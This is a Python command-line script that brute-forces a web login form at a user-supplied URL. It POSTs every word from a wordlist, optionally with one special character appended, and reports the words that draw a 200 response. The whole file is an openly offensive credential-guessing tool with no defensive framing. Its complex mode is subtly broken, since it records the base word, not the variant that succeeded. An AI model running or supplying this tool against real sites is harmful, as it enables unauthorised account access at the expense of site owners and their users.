import requests
import sys
import argparse

def progress(count, total, status=''):
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
    sys.stdout.flush()

def print_passwords(pswd_list):
    if (pswd_list):
        print("\nPasswords Found:")
        for password in pswd_list:
            print(password)
    else:
        print("NO PASSWORDS FOUND")

def find_simple_passwords(url, pswd_file):
    Passwords_Found = []

    file = open(pswd_file, 'r')
    Words = list(file.read().split())

    Passwords_tried = 0
    total_words_trying = len(Words)

    for password in Words:
        Passwords_tried += 1
        payload = {'pword':password}
        response = requests.post(url,data=payload)
        progress(Passwords_tried, total_words_trying, status=' Checking Wordlist')
        if (response.status_code == 200):
            Passwords_Found.append(password)

    return Passwords_Found

def find_complex_passwords(url, pswd_file):
    Passwords_Found = []

    file = open(pswd_file, 'r')
    Words = list(file.read().split())

    special_chars = ['','!','@','#','$','%','^','&','*','(',')','-','_','+','=','?',':','<','.','/','~']

    Passwords_tried = 0
    total_words_trying = len(Words)*len(special_chars)

    for password in Words:
        for char in special_chars:
            Passwords_tried += 1
            new_password = password + char

            payload = {'pword':new_password}
            response = requests.post(url,data=payload)
            progress(Passwords_tried, total_words_trying, status=' Checking Wordlist with special characters')
            if (response.status_code == 200):
                Passwords_Found.append(password)

    return Passwords_Found


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Run a password Cracker algorithm.')
    parser.add_argument('URL', metavar='URL', type=str, help='The url to attack.')
    parser.add_argument('WORDLIST', metavar='WORDLIST', type=str, help='list of passswords to try.')

    parser.add_argument('-c', dest='complex_pswd', action='store_true',
                        help='use the more complex password checker')

    parser.set_defaults(complex_pswd=False)

    args = parser.parse_args()

    url = args.URL
    Password_file = args.WORDLIST
    complex_pswd = args.complex_pswd

    if (complex_pswd):
        pswd_found = find_complex_passwords(url,Password_file)
    else:
        pswd_found = find_simple_passwords(url,Password_file)

    print_passwords(pswd_found)
